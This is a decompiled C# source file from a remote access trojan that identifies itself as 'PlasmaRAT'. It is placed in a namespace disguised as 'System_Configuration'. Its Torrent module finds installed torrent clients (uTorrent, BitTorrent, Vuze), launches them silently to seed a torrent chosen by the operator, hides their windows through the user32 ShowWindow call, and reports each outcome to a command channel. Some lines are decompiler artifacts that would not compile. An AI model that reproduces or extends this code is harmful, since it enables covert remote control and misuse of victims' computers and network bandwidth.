using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace System_Configuration
{
	// Token: 0x0200001A RID: 26
	[StandardModule]
	internal sealed class Torrent
	{
		// Token: 0x060000AC RID: 172
		[DllImport("user32.dll")]
		private static extern int ShowWindow(int hwnd, int nCmdShow);

		// Token: 0x060000AD RID: 173 RVA: 0x0000B2EC File Offset: 0x000094EC
		public static void SeedTorrent(string path)
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				if (!Torrent.IsVuze())
				{
					goto IL_33;
				}
				IL_10:
				num2 = 3;
				Torrent.SeedItVuze(Torrent.VuzePath, path);
				IL_1D:
				num2 = 4;
				PlasmaRAT.TalktoChannel("Seeding Torrent With Vuze", string.Empty);
				IL_2E:
				goto IL_143;
				IL_33:
				num2 = 6;
				if (!Torrent.IsBitTorrent())
				{
					goto IL_64;
				}
				IL_3C:
				num2 = 7;
				Torrent.SeedIt(Torrent.BitLocalPath, Torrent.BitLocalPath, path);
				IL_4E:
				num2 = 8;
				PlasmaRAT.TalktoChannel("Seeding Torrent with BitTorrent", string.Empty);
				IL_5F:
				goto IL_143;
				IL_64:
				num2 = 10;
				if (!Torrent.IsUtorrent())
				{
					goto IL_98;
				}
				IL_6E:
				num2 = 11;
				Torrent.SeedIt(Torrent.UTorrentPath, Torrent.UTorrentLocalPath, path);
				IL_81:
				num2 = 12;
				PlasmaRAT.TalktoChannel("Seeding Torrent with uTorrent", string.Empty);
				IL_93:
				goto IL_143;
				IL_98:
				num2 = 14;
				IL_9B:
				num2 = 15;
				PlasmaRAT.TalktoChannel("Unable to Seed: No Torrent Client Installed", string.Empty);
				IL_AD:
				goto IL_143;
				IL_B2:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_104:
				goto IL_138;
				IL_106:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_116:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_106;
			}
			IL_138:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_143:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x060000AE RID: 174 RVA: 0x0000B460 File Offset: 0x00009660
		public static string GetFileNameFromURL(string URL)
		{
			string result;
			try
			{
				result = URL.Substring(URL.LastIndexOf("/", StringComparison.Ordinal) + 1);
			}
			catch (Exception ex)
			{
				result = URL;
			}
			return result;
		}

		// Token: 0x060000AF RID: 175 RVA: 0x0000B4A8 File Offset: 0x000096A8
		public static bool IsUtorrent()
		{
			int num;
			bool flag;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				if (!File.Exists(Torrent.UTorrentPath))
				{
					goto IL_1B;
				}
				IL_15:
				num2 = 3;
				flag = true;
				goto IL_88;
				IL_1B:
				num2 = 5;
				flag = false;
				IL_21:
				goto IL_88;
				IL_23:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_49:
				goto IL_7D;
				IL_4B:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_5B:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_4B;
			}
			IL_7D:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_88:
			bool result = flag;
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x0000B558 File Offset: 0x00009758
		public static bool IsBitTorrent()
		{
			int num;
			bool flag;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				if (!File.Exists(Torrent.BitLocalPath))
				{
					goto IL_1B;
				}
				IL_15:
				num2 = 3;
				flag = true;
				goto IL_88;
				IL_1B:
				num2 = 5;
				flag = false;
				IL_21:
				goto IL_88;
				IL_23:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_49:
				goto IL_7D;
				IL_4B:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_5B:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_4B;
			}
			IL_7D:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_88:
			bool result = flag;
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x0000B608 File Offset: 0x00009808
		public static bool IsVuze()
		{
			int num;
			bool flag;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				if (!File.Exists(Torrent.VuzePath))
				{
					goto IL_1B;
				}
				IL_15:
				num2 = 3;
				flag = true;
				goto IL_88;
				IL_1B:
				num2 = 5;
				flag = false;
				IL_21:
				goto IL_88;
				IL_23:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_49:
				goto IL_7D;
				IL_4B:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_5B:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_4B;
			}
			IL_7D:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_88:
			bool result = flag;
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x0000B6B8 File Offset: 0x000098B8
		public static void SeedIt(string ClientPath, string LocalPath, string TorrentPath)
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				IL_0F:
				num2 = 3;
				processStartInfo.FileName = ClientPath;
				IL_18:
				num2 = 4;
				processStartInfo.Arguments = string.Concat(new string[]
				{
					"/DIRECTORY ",
					LocalPath,
					" \"",
					TorrentPath,
					"\""
				});
				IL_61:
				num2 = 5;
				processStartInfo.CreateNoWindow = true;
				IL_6A:
				num2 = 6;
				Process.Start(processStartInfo);
				IL_73:
				num2 = 7;
				if (!ClientPath.Contains("uTorrent"))
				{
					goto IL_93;
				}
				IL_82:
				num2 = 8;
				Torrent.HideIt("uTorrent");
				IL_8E:
				goto IL_168;
				IL_93:
				num2 = 10;
				if (!ClientPath.Contains("BitTorrent"))
				{
					goto IL_B5;
				}
				IL_A3:
				num2 = 11;
				Torrent.HideIt("BitTorrent");
				IL_B0:
				goto IL_168;
				IL_B5:
				num2 = 13;
				if (!ClientPath.Contains("Azureus"))
				{
					goto IL_D2;
				}
				IL_C5:
				num2 = 14;
				Torrent.HideIt("Azureus");
				IL_D2:
				goto IL_168;
				IL_D7:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_127:
				goto IL_15D;
				IL_129:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_13A:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_129;
			}
			IL_15D:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_168:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x060000B3 RID: 179 RVA: 0x0000B854 File Offset: 0x00009A54
		public static void SeedItVuze(string ClientPath, string TorrentURL)
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				IL_0F:
				num2 = 3;
				processStartInfo.FileName = ClientPath;
				IL_18:
				num2 = 4;
				processStartInfo.Arguments = TorrentURL;
				IL_21:
				num2 = 5;
				processStartInfo.CreateNoWindow = true;
				IL_2A:
				num2 = 6;
				Process process = Process.Start(processStartInfo);
				IL_33:
				num2 = 7;
				Torrent.HideIt(Conversions.ToString((int)process.MainWindowHandle));
				IL_4A:
				num2 = 8;
				Thread.Sleep(1000);
				IL_56:
				goto IL_CD;
				IL_58:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_8C:
				goto IL_C2;
				IL_8E:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_9F:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_8E;
			}
			IL_C2:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_CD:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x0000B948 File Offset: 0x00009B48
		public static void HideIt(string TorrentClient)
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				Thread.Sleep(1000);
				IL_13:
				num2 = 3;
				Process[] processesByName = Process.GetProcessesByName(TorrentClient);
				IL_1C:
				num2 = 4;
				Torrent.ShowWindow(processesByName[0].MainWindowHandle.ToInt32(), 0);
				IL_39:
				goto IL_A0;
				IL_3B:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_5F:
				goto IL_95;
				IL_61:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_72:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_61;
			}
			IL_95:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_A0:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x04000083 RID: 131
		public static string UTorrentPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\uTorrent\\uTorrent.exe";

		// Token: 0x04000084 RID: 132
		public static string UTorrentLocalPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\uTorrent\\uTorrent.exe";

		// Token: 0x04000085 RID: 133
		public static string BitTorrentPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\BitTorrent\\bittorrent.exe";

		// Token: 0x04000086 RID: 134
		public static string BitLocalPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BitTorrent\\BitTorrent.exe";

		// Token: 0x04000087 RID: 135
		public static string VuzePath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Vuze\\Azureus.exe";

		// Token: 0x04000088 RID: 136
		public static string VuzeLocalPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Azureus\\torrents\\";
	}
}
